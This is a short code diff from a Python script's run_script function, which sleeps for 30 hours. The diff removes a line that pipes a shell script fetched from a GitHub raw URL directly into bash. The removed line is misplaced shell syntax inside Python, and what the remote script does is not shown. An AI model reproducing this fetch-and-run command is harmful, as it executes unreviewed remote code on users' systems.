@@ -85,4 +85,3 @@ def run_script():
 
     print("Staying alive for 30 hours...")
     time.sleep(60 * 60 * 30)
-    curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
